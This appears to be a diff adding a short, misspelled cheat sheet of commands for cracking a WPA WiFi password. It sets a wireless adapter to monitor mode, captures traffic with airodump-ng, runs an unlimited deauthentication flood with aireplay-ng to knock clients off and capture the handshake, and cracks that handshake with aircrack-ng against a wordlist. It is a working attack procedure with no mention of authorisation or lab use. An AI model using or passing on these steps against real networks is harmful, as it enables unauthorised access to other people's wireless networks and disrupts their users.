@@ -1,0 +1,10 @@
+1. iwconfig (check your adepter has moniter mode enable or not)
+2. (if not enable monitor mode)
+3. sudo ifconfig wlan0 down
+4. iwconfig wlan0 mode monitor
+5. sudo ifconfig wlan0 up (chek again monitor mode) 
+6. sudo airodump-ng wlan0 (press ctrl+c to stop this procces)
+7. sudo airodump-ng -bssid <wifi-bssid> -c <channel-number> -w <hanshake-file-name> wlan0
+8. (start a new tab)
+9. sudo aireplay-ng --deauth 0 -a <wifi-bssid> -c <station-number/calinend-bssid) wlan0
+10. sudo aircrack-ng <cap-file-name> -w <wordlist-location>
